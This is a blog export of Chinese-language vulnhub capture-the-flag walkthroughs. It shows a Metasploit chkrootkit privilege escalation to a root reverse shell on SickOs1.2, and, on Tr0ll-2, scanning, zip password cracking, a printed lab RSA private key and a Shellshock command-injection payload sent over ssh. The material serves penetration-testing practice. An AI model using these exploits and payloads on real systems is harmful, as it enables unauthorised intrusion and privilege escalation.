m6QrrJnhcNykbebU;</span><br><span class="line">[*] Writing to socket A</span><br><span class="line">[*] Writing to socket B</span><br><span class="line">[*] Reading from sockets...</span><br><span class="line">[*] Reading from socket A</span><br><span class="line">[*] A: <span class="string">&quot;m6QrrJnhcNykbebU\r\n&quot;</span></span><br><span class="line">[*] Matching...</span><br><span class="line">[*] B is input...</span><br><span class="line">[*] Command shell session 2 opened (192.168.233.128:8080 -&gt; 192.168.233.129:37735) at 2020-03-30 03:15:49 -0400</span><br><span class="line">[+] Deleted /tmp/update</span><br><span class="line">id</span><br><span class="line">[*] <span class="built_in">exec</span>: id</span><br><span class="line"></span><br><span class="line">uid=0(root) gid=0(root) 组=0(root)</span><br><span class="line">msf5 exploit(unix/<span class="built_in">local</span>/chkrootkit) &gt; sessions -l</span><br><span class="line"></span><br><span class="line">Active sessions</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">  Id  Name  Type             Information                                                                       Connection</span><br><span class="line">  --  ----  ----             -----------                                                                       ----------</span><br><span class="line">  1         shell x86/linux  Linux ubuntu 3.11.0-15-generic <span class="comment">#25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UT...  192.168.233.128:443 -&gt; 192.168.233.129:48369 (192.168.233.129)</span></span><br><span class="line">  2         shell cmd/unix                                                                                     192.168.233.128:8080 -&gt; 192.168.233.129:37735 (192.168.233.129)</span><br><span class="line"></span><br><span class="line">msf5 exploit(unix/<span class="built_in">local</span>/chkrootkit) &gt; sessions 2</span><br><span class="line">[*] Starting interaction with 2...</span><br><span class="line"></span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>

<p>成功的获取了root权限，现在来寻找flag</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf5 exploit(unix/<span class="built_in">local</span>/chkrootkit) &gt; sessions 2</span><br><span class="line">[*] Starting interaction with 2...</span><br><span class="line"></span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">root@ubuntu:/tmp<span class="comment"># id</span></span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@ubuntu:/tmp<span class="comment"># cd /root</span></span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line">root@ubuntu:~<span class="comment"># ls</span></span><br><span class="line">ls</span><br><span class="line">304d840d52840689e0ab0af56d6d3a18-chkrootkit-0.49.tar.gz  chkrootkit-0.49</span><br><span class="line">7d03aaa2bf93d80040f3f22ec6ad9d5a.txt                     newRule</span><br><span class="line">root@ubuntu:~<span class="comment"># cat 7d03aaa2bf93d80040f3f22ec6ad9d5a.txt</span></span><br><span class="line">cat 7d03aaa2bf93d80040f3f22ec6ad9d5a.txt</span><br><span class="line">WoW! If you are viewing this, You have <span class="string">&quot;Sucessfully!!&quot;</span> completed SickOs1.2, the challenge is more focused on elimination of tool <span class="keyword">in</span> real scenarios <span class="built_in">where</span> tools can be blocked during an assesment and thereby fooling tester(s), gathering more information about the target using different methods, though <span class="keyword">while</span> developing many of the tools were limited/completely blocked, to get a feel of Old School and testing it manually.</span><br><span class="line"></span><br><span class="line">Thanks <span class="keyword">for</span> giving this try.</span><br><span class="line"></span><br><span class="line">@vulnhub: Thanks <span class="keyword">for</span> hosting this UP!.</span><br></pre></td></tr></table></figure>

<p>成功的获取到了flag</p>
<h3 id="知识点总结"><a href="#知识点总结" class="headerlink" title="知识点总结"></a>知识点总结</h3><ul>
<li>HTTP put方法写入shell</li>
<li>cron定时任务+chkrootkit漏洞CVE-2014-0476—提权</li>
<li>msf的exploit/unix/local/chkrootkit模块—提权</li>
</ul>
<p><font color="red">Game over</font></p>
<p>不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this…It’s a pity…</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
<p><font color="green"><strong><em>The end,to be continue…</em></strong></font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>Hack-The-Box-walkthrough[SneakyMailer]</title>
    <url>/2020/07/12/SneakyMailer/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">enter the root pass hash to unlock this article</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="2226bb3220308e09a270bcabc54839d6966bbfe6bbcc51be5e974ccadc5014c6"></script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>HackTheBox walkthrough</category>
      </categories>
      <tags>
        <tag>HackTheBox靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机渗透[Tr0ll-2]</title>
    <url>/2020/04/01/Tr0ll-2/</url>
    <content><![CDATA[<h3 id="名称"><a href="#名称" class="headerlink" title="名称"></a>名称</h3><p>名称：Tr0ll: 2<br>发布日期：2014年10月24日</p>
<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p>Tr0ll2.rar</p>
<ul>
<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS90cjBsbC9UcjBsbDIucmFy">https://download.vulnhub.com/tr0ll/Tr0ll2.rar<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS90cjBsbC9UcjBsbDIucmFyLnRvcnJlbnQ=">https://download.vulnhub.com/tr0ll/Tr0ll2.rar.torrent<i class="fa fa-external-link-alt"></i></span> </li>
</ul>
<p>Tr0ll2_vbox.rar</p>
<ul>
<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS90cjBsbC9UcjBsbDJfdmJveC5yYXI=">https://download.vulnhub.com/tr0ll/Tr0ll2_vbox.rar<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS90cjBsbC9UcjBsbDJfdmJveC5yYXIudG9ycmVudA==">https://download.vulnhub.com/tr0ll/Tr0ll2_vbox.rar.torrent<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<a id="more"></a>

<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>Tr0ll系列VM中的第2台靶机。这比原始的Tr0ll难度有所提高，但是解决所需的时间大致相同，并且不会出错，巨魔仍然存在！:)</p>
<p>难度是从初学者到中级。</p>
<p>VM应该从DHCP提取有效IP。该VM已通过验证，可以在VMware工作站5，VMware Player 5，VMware Fusion和Virtual box上运行。virtual box用户可能需要启用附加的网卡才能拉出有效的IP地址。</p>
<p>特别感谢@ Eagle11，@ superkojiman和@leonjza经历了测试，并感谢freenode上#overflowsec的成员给了一些建议。如果机器有问题，请随时通过@ Maleus21或maleus overflowsecurity.com与我联系。-马累<span class="exturl" data-url="aHR0cDovL3d3dy5vdmVyZmxvd3NlY3VyaXR5LmNvbXRyMGxsMi5yYXIv">www.overflowsecurity.comTr0ll2.rar<i class="fa fa-external-link-alt"></i></span> = VMware，Tr0ll2_vbox.rar = VirtualBox</p>
<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>上nmap</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sn -v 192.168.66.*</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.66.16</span><br><span class="line">Host is up (0.00030s latency).</span><br><span class="line">MAC Address: 00:0C:29:F7:66:43 (VMware)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sV -v -p- 192.168.66.16</span></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     vsftpd 2.0.8 or later</span><br><span class="line">22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))</span><br><span class="line">MAC Address: 00:0C:29:F7:66:43 (VMware)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -p 21,22,80 -A -v -T4 --script=vuln 192.168.66.16</span></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     vsftpd 2.0.8 or later</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_sslv2-drown: </span><br><span class="line">22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_http-csrf: Couldn<span class="string">&#x27;t find any CSRF vulnerabilities.</span></span><br><span class="line"><span class="string">|_http-dombased-xss: Couldn&#x27;</span>t find any DOM based XSS.</span><br><span class="line">| http-enum: </span><br><span class="line">|_  /robots.txt: Robots file</span><br><span class="line">|_http-server-header: Apache/2.2.22 (Ubuntu)</span><br><span class="line">|_http-stored-xss: Couldn<span class="string">&#x27;t find any stored XSS vulnerabilities.</span></span><br><span class="line"><span class="string">| vulners: </span></span><br><span class="line"><span class="string">|   cpe:/a:apache:http_server:2.2.22: </span></span><br><span class="line"><span class="string">|       CVE-2017-7679   7.5     https://vulners.com/cve/CVE-2017-7679</span></span><br><span class="line"><span class="string">|       CVE-2017-7668   7.5     https://vulners.com/cve/CVE-2017-7668</span></span><br><span class="line"><span class="string">|       CVE-2017-3169   7.5     https://vulners.com/cve/CVE-2017-3169</span></span><br><span class="line"><span class="string">|       CVE-2017-3167   7.5     https://vulners.com/cve/CVE-2017-3167</span></span><br><span class="line"><span class="string">|       CVE-2013-2249   7.5     https://vulners.com/cve/CVE-2013-2249</span></span><br><span class="line"><span class="string">|       CVE-2018-1312   6.8     https://vulners.com/cve/CVE-2018-1312</span></span><br><span class="line"><span class="string">|       CVE-2013-1862   5.1     https://vulners.com/cve/CVE-2013-1862</span></span><br><span class="line"><span class="string">|       CVE-2014-0231   5.0     https://vulners.com/cve/CVE-2014-0231</span></span><br><span class="line"><span class="string">|       CVE-2014-0098   5.0     https://vulners.com/cve/CVE-2014-0098</span></span><br><span class="line"><span class="string">|       CVE-2013-6438   5.0     https://vulners.com/cve/CVE-2013-6438</span></span><br><span class="line"><span class="string">|       CVE-2013-5704   5.0     https://vulners.com/cve/CVE-2013-5704</span></span><br><span class="line"><span class="string">|       CVE-2016-4975   4.3     https://vulners.com/cve/CVE-2016-4975</span></span><br><span class="line"><span class="string">|       CVE-2013-1896   4.3     https://vulners.com/cve/CVE-2013-1896</span></span><br><span class="line"><span class="string">|       CVE-2012-4558   4.3     https://vulners.com/cve/CVE-2012-4558</span></span><br><span class="line"><span class="string">|       CVE-2012-3499   4.3     https://vulners.com/cve/CVE-2012-3499</span></span><br><span class="line"><span class="string">|       CVE-2016-8612   3.3     https://vulners.com/cve/CVE-2016-8612</span></span><br><span class="line"><span class="string">|_      CVE-2012-2687   2.6     https://vulners.com/cve/CVE-2012-2687</span></span><br></pre></td></tr></table></figure>

<p>dirb目录爆破一波</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># dirb http://192.168.66.16/</span></span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Tue Mar 31 23:19:58 2020</span><br><span class="line">URL_BASE: http://192.168.66.16/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612                                                          </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://192.168.66.16/ ----</span><br><span class="line">+ http://192.168.66.16/cgi-bin/ (CODE:403|SIZE:289)                                                                       </span><br><span class="line">+ http://192.168.66.16/index (CODE:200|SIZE:110)                                                                          </span><br><span class="line">+ http://192.168.66.16/index.html (CODE:200|SIZE:110)                                                                     </span><br><span class="line">+ http://192.168.66.16/robots (CODE:200|SIZE:346)                                                                         </span><br><span class="line">+ http://192.168.66.16/robots.txt (CODE:200|SIZE:346)                                                                     </span><br><span class="line">+ http://192.168.66.16/server-status (CODE:403|SIZE:294)                                                                  </span><br><span class="line">                                                                                                                          </span><br><span class="line">-----------------</span><br><span class="line">END_TIME: Tue Mar 31 23:20:04 2020</span><br><span class="line">DOWNLOADED: 4612 - FOUND: 6</span><br></pre></td></tr></table></figure>

<p>查看robots.txt<br><span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguNjYuMTYvcm9ib3Rz">http://192.168.66.16/robots<i class="fa fa-external-link-alt"></i></span></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">User-agent:*</span><br><span class="line">Disallow:</span><br><span class="line">/noob</span><br><span class="line">/nope</span><br><span class="line">/try_harder</span><br><span class="line">/keep_trying</span><br><span class="line">/isnt_this_annoying</span><br><span class="line">/nothing_here</span><br><span class="line">/404</span><br><span class="line">/LOL_at_the_last_one</span><br><span class="line">/trolling_is_fun</span><br><span class="line">/zomg_is_this_it</span><br><span class="line">/you_found_me</span><br><span class="line">/I_know_this_sucks</span><br><span class="line">/You_could_give_up</span><br><span class="line">/dont_bother</span><br><span class="line">/will_it_ever_end</span><br><span class="line">/I_hope_you_scripted_this</span><br><span class="line">/ok_this_is_it</span><br><span class="line">/stop_whining</span><br><span class="line">/why_are_you_still_looking</span><br><span class="line">/just_quit</span><br><span class="line">/seriously_stop</span><br></pre></td></tr></table></figure>

<p>将/robots.txt中找到的所有路径添加到字典中，然后再次dirb。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/troll2<span class="comment"># dirb http://192.168.66.16/ wordlist /usr/share/wordlists/dirb/common.txt</span></span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Tue Mar 31 23:29:24 2020</span><br><span class="line">URL_BASE: http://192.168.66.16/</span><br><span class="line">WORDLIST_FILES: wordlist</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 21                                                            </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://192.168.66.16/ ----</span><br><span class="line">+ http://192.168.66.16//noob (CODE:301|SIZE:313)                                                                          </span><br><span class="line">+ http://192.168.66.16//keep_trying (CODE:301|SIZE:320)                                                                   </span><br><span class="line">+ http://192.168.66.16//dont_bother (CODE:301|SIZE:320)                                                                   </span><br><span class="line">+ http://192.168.66.16//ok_this_is_it (CODE:301|SIZE:322)                                                                 </span><br><span class="line">                                                                                                                          </span><br><span class="line">-----------------</span><br><span class="line">END_TIME: Tue Mar 31 23:29:24 2020</span><br><span class="line">DOWNLOADED: 21 - FOUND: 4</span><br></pre></td></tr></table></figure>

<p>找到了4个目录，但除了HTML图像中的图像和注释之外，什么都没有。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;img src=<span class="string">&#x27;cat_the_troll.jpg&#x27;</span>&gt;</span><br><span class="line">&lt;!--What did you really think to find here? Try Harder!&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>对于目录，发现这是一张已导入到名为cat_the_troll.jpg的页面的图像，然后全部下载了它们。一开始没有发现任何差异，然后尝试检查所有jpg文件的MD5总和。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/troll2<span class="comment"># md5sum *.jpg</span></span><br><span class="line">f094e16de91dae231812a2fb382d8803  dont_bother.jpg</span><br><span class="line">8e40e4bf4212b317788de52381072cd8  keep_trying.jpg</span><br><span class="line">8e40e4bf4212b317788de52381072cd8  noob.jpg</span><br><span class="line">8e40e4bf4212b317788de52381072cd8  ok_this_is_it.jpg</span><br><span class="line">973c57fc28ca1ce8703bdaf102f80370  tr0ll_again.jpg</span><br></pre></td></tr></table></figure>

<p>dont_bother.jpg具有不同的MD5哈希值，因此请看一下。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/troll2<span class="comment"># strings dont_bother.jpg </span></span><br><span class="line">JFIF</span><br><span class="line"><span class="comment">#3-652-108?QE8&lt;M=01F`GMTV[\[7DcjcXjQY[W</span></span><br><span class="line">)W:1:WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW</span><br><span class="line">...</span><br><span class="line">Look Deep within y0ur_self <span class="keyword">for</span> the answer</span><br></pre></td></tr></table></figure>

<p>浏览器访问到<span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguNjYuMTYveTB1cl9zZWxmLyVFRiVCQyU4QyVFNiU4OSVCRSVFNSU4OCVCMCVFNCVCQSU4NiVFNCVCOCU4MCVFNCVCOCVBQSVFNSU5MCU4RCVFNCVCOCVCQWFuc3dlci50eHQlRTclOUElODQlRTYlOTYlODclRTQlQkIlQjYlRTMlODAlODIlRTclOUMlOEIlRTglQjUlQjclRTYlOUQlQTUlRTUlODMlOEYlRTQlQjglODAlRTQlQjglQUElRTUlQUYlODYlRTclQTAlODElRTYlOTYlODclRTQlQkIlQjYlRTMlODAlODIlRTQlQkQlODYlRTYlOTglQUYlRTYlQUYlOEYlRTQlQjglQUElRTUlQUYlODYlRTclQTAlODElRTklODMlQkQlRTclOTQlQThiYXNlNjQlRTclQkMlOTYlRTclQTAlODE=">http://192.168.66.16/y0ur_self/，找到了一个名为answer.txt的文件。看起来像一个密码文件。但是每个密码都用base64编码<i class="fa fa-external-link-alt"></i></span></p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub233.jpg"></li>
</ul>
<p>answer.txt</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">QQo=</span><br><span class="line">QQo=</span><br><span class="line">QUEK</span><br><span class="line">QUIK</span><br><span class="line">QUJNCg==</span><br><span class="line">QUMK</span><br><span class="line">QUNUSAo=</span><br><span class="line">QUkK</span><br><span class="line">QUlEUwo=</span><br><span class="line">QU0K</span><br><span class="line">QU9MCg==</span><br><span class="line">QU9MCg==</span><br><span class="line">QVNDSUkK</span><br><span class="line">QVNMCg==</span><br></pre></td></tr></table></figure>

<p>与Web服务无关。继续进行FTP服务。<br>使用Tr0ll作为用户名和密码登录很容易。找到了一个zip文件，并将其pull到Kali上，但该zip文件受密码保护。</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub234.jpg"></li>
</ul>
<p>现在解码answer.txt文本中的base64加密字符串，并用作字典来解压缩zip文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat answer.txt | base64 --decode &gt; decoded_answer.txt</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/troll2<span class="comment"># fcrackzip -v -D -u -p decoded_answer.txt lmao.zip</span></span><br><span class="line">found file <span class="string">&#x27;noob&#x27;</span>, (size cp/uc   1300/  1679, flags 9, chk 1005)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PASSWORD FOUND!!!!: pw == ItCantReallyBeThisEasyRightLOL</span><br></pre></td></tr></table></figure>

<p>解压缩后查看压缩包内的文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/troll2<span class="comment"># unzip lmao.zip</span></span><br><span class="line">Archive:  lmao.zip</span><br><span class="line">[lmao.zip] noob password: </span><br><span class="line">  inflating: noob                    </span><br><span class="line">root@kali:~/vulnhub/troll2<span class="comment"># ls -la</span></span><br><span class="line">总用量 2408</span><br><span class="line">drwxr-xr-x  2 root root    4096 4月   1 01:50 .</span><br><span class="line">drwxrwxrwx 11 root root    4096 3月  31 23:26 ..</span><br><span class="line">-rw-r--r--  1 root root 1412653 10月  4  2014 answer.txt</span><br><span class="line">-rw-r--r--  1 root root  886136 4月   1 01:47 decoded_answer.txt</span><br><span class="line">-rw-r--r--  1 root root   15873 4月   1 01:26 dont_bother.jpg</span><br><span class="line">-rw-r--r--  1 root root   15831 4月   1 01:26 keep_trying.jpg</span><br><span class="line">-rw-r--r--  1 root root    1474 4月   1 01:49 lmao.zip</span><br><span class="line">-rw-------  1 root root    1679 10月  4  2014 noob</span><br><span class="line">-rw-r--r--  1 root root   15831 4月   1 01:26 noob.jpg</span><br><span class="line">-rw-r--r--  1 root root   15831 4月   1 01:26 ok_this_is_it.jpg</span><br><span class="line">-rw-r--r--  1 root root   77438 4月   1 01:26 tr0ll_again.jpg</span><br><span class="line">-rw-r--r--  1 root root     322 3月  31 23:27 wordlist</span><br><span class="line">root@kali:~/vulnhub/troll2<span class="comment"># cat noob</span></span><br><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIIEpAIBAAKCAQEAsIthv5CzMo5v663EMpilasuBIFMiftzsr+w+UFe9yFhAoLqq</span><br><span class="line">yDSPjrmPsyFePcpHmwWEdeR5AWIv/RmGZh0Q+Qh6vSPswix7//SnX/QHvh0CGhf1</span><br><span class="line">/9zwtJSMely5oCGOujMLjDZjryu1PKxET1CcUpiylr2kgD/fy11Th33KwmcsgnPo</span><br><span class="line">q+pMbCh86IzNBEXrBdkYCn222djBaq+mEjvfqIXWQYBlZ3HNZ4LVtG+5in9bvkU5</span><br><span class="line">z+13lsTpA9px6YIbyrPMMFzcOrxNdpTY86ozw02+MmFaYfMxyj2GbLej0+qniwKy</span><br><span class="line">e5SsF+eNBRKdqvSYtsVE11SwQmF4imdJO0buvQIDAQABAoIBAA8ltlpQWP+yduna</span><br><span class="line">u+W3cSHrmgWi/Ge0Ht6tP193V8IzyD/CJFsPH24Yf7rX1xUoIOKtI4NV+gfjW8i0</span><br><span class="line">gvKJ9eXYE2fdCDhUxsLcQ+wYrP1j0cVZXvL4CvMDd9Yb1JVnq65QKOJ73CuwbVlq</span><br><span class="line">UmYXvYHcth324YFbeaEiPcN3SIlLWms0pdA71Lc8kYKfgUK8UQ9Q3u58Ehlxv079</span><br><span class="line">La35u5VH7GSKeey72655A+t6d1ZrrnjaRXmaec/j3Kvse2GrXJFhZ2IEDAfa0GXR</span><br><span class="line">xgl4PyN8O0L+TgBNI/5nnTSQqbjUiu+aOoRCs0856EEpfnGte41AppO99hdPTAKP</span><br><span class="line">aq/r7+UCgYEA17OaQ69KGRdvNRNvRo4abtiKVFSSqCKMasiL6aZ8NIqNfIVTMtTW</span><br><span class="line">K+WPmz657n1oapaPfkiMRhXBCLjR7HHLeP5RaDQtOrNBfPSi7AlTPrRxDPQUxyxx</span><br><span class="line">n48iIflln6u85KYEjQbHHkA3MdJBX2yYFp/w6pYtKfp15BDA8s4v9HMCgYEA0YcB</span><br><span class="line">TEJvcW1XUT93ZsN+lOo/xlXDsf+9Njrci+G8l7jJEAFWptb/9ELc8phiZUHa2dIh</span><br><span class="line">WBpYEanp2r+fKEQwLtoihstceSamdrLsskPhA4xF3zc3c1ubJOUfsJBfbwhX1tQv</span><br><span class="line">ibsKq9kucenZOnT/WU8L51Ni5lTJa4HTQwQe9A8CgYEAidHV1T1g6NtSUOVUCg6t</span><br><span class="line">0PlGmU9YTVmVwnzU+LtJTQDiGhfN6wKWvYF12kmf30P9vWzpzlRoXDd2GS6N4rdq</span><br><span class="line">vKoyNZRw+bqjM0XT+2CR8dS1DwO9au14w+xecLq7NeQzUxzId5tHCosZORoQbvoh</span><br><span class="line">ywLymdDOlq3TOZ+CySD4/wUCgYEAr/ybRHhQro7OVnneSjxNp7qRUn9a3bkWLeSG</span><br><span class="line">th8mjrEwf/b/1yai2YEHn+QKUU5dCbOLOjr2We/Dcm6cue98IP4rHdjVlRS3oN9s</span><br><span class="line">G9cTui0pyvDP7F63Eug4E89PuSziyphyTVcDAZBriFaIlKcMivDv6J6LZTc17sye</span><br><span class="line">q51celUCgYAKE153nmgLIZjw6+FQcGYUl5FGfStUY05sOh8kxwBBGHW4/fC77+NO</span><br><span class="line">vW6CYeE+bA2AQmiIGj5CqlNyecZ08j4Ot/W3IiRlkobhO07p3nj601d+OgTjjgKG</span><br><span class="line">zp8XZNG8Xwnd5K59AVXZeiLe2LGeYbUKGbHyKE3wEVTTEmgaxF4D1g==</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure>

<p>是的rsa私钥。查看SSH服务。因为文件名为noob，所以尝试使用用户noob和私钥登录SSH服务。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/troll2<span class="comment"># ssh -i noob noob@192.168.66.16</span></span><br><span class="line">The authenticity of host <span class="string">&#x27;192.168.66.16 (192.168.66.16)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:I3xuSgcBlIsoldKTkOyVYwx8B4NLGl0fDDTi0H6ExYg.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>192.168.66.16<span class="string">&#x27; (ECDSA) to the list of known hosts.</span></span><br><span class="line"><span class="string">TRY HARDER LOL!</span></span><br><span class="line"><span class="string">Connection to 192.168.66.16 closed.</span></span><br></pre></td></tr></table></figure>

<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>能够登录，但连接被关闭。有一段时间，Vulnhub于2014年10月24日发布了此易受攻击的操作系统。在此附近，存在一个漏洞可以绕过此漏洞</p>
<ul>
<li>参考<span class="exturl" data-url="aHR0cHM6Ly9yZXNvdXJjZXMuaW5mb3NlY2luc3RpdHV0ZS5jb20vcHJhY3RpY2FsLXNoZWxsc2hvY2stZXhwbG9pdGF0aW9uLXBhcnQtMi8jZ3JlZg==">SHELLSHOCK漏洞<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/troll2<span class="comment"># ssh -i noob noob@192.168.66.16 &#x27;() &#123; :;&#125;; /bin/bash&#x27;</span></span><br><span class="line">id</span><br><span class="line">uid=1002(noob) gid=1002(noob) groups=1002(noob)</span><br><span class="line">whoami</span><br><span class="line">noob</span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line">/home/noob</span><br></pre></td></tr></table></figure>

<p>现在有一个低权限shell。然后查看目录收集敏感信息。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /</span><br><span class="line">ls</span><br><span class="line">bin</span><br><span class="line">boot</span><br><span class="line">dev</span><br><span class="line">etc</span><br><span class="line">home</span><br><span class="line">initrd.img</span><br><span class="line">lib</span><br><span class="line">lost+found</span><br><span class="line">media</span><br><span class="line">mnt</span><br><span class="line">nothing_to_see_here</span><br><span class="line">opt</span><br><span class="line">proc</span><br><span class="line">root</span><br><span class="line">run</span><br><span class="line">sbin</span><br><span class="line">selinux</span><br><span class="line">srv</span><br><span class="line">sys</span><br><span class="line">tmp</span><br><span class="line">usr</span><br><span class="line">var</span><br><span class="line">vmlinuz</span><br><span class="line"><span class="built_in">cd</span> nothing_to_see_here</span><br><span class="line">ls</span><br><span class="line">choose_wisely</span><br><span class="line"><span class="built_in">cd</span> choose_wisely</span><br><span class="line">ls</span><br><span class="line">door1</span><br><span class="line">door2</span><br><span class="line">door3</span><br><span class="line">ls -al *</span><br><span class="line">door1:</span><br><span class="line">total 16</span><br><span class="line">drwsr-xr-x 2 root root 4096 Oct  4  2014 .</span><br><span class="line">drwsr-xr-x 5 root root 4096 Oct  4  2014 ..</span><br><span class="line">-rwsr-xr-x 1 root root 7271 Oct  4  2014 r00t</span><br><span class="line"></span><br><span class="line">door2:</span><br><span class="line">total 16</span><br><span class="line">drwsr-xr-x 2 root root 4096 Oct  5  2014 .</span><br><span class="line">drwsr-xr-x 5 root root 4096 Oct  4  2014 ..</span><br><span class="line">-rwsr-xr-x 1 root root 7273 Oct  5  2014 r00t</span><br><span class="line"></span><br><span class="line">door3:</span><br><span class="line">total 20</span><br><span class="line">drwsr-xr-x 2 root root 4096 Oct  5  2014 .</span><br><span class="line">drwsr-xr-x 5 root root 4096 Oct  4  2014 ..</span><br><span class="line">-rwsr-xr-x 1 root root 8401 Oct  5  2014 r00t</span><br></pre></td></tr></table></figure>

<p>现在发现有设置SUID位的r00t二进制文件。认为必须利用这些二进制文件。</p>
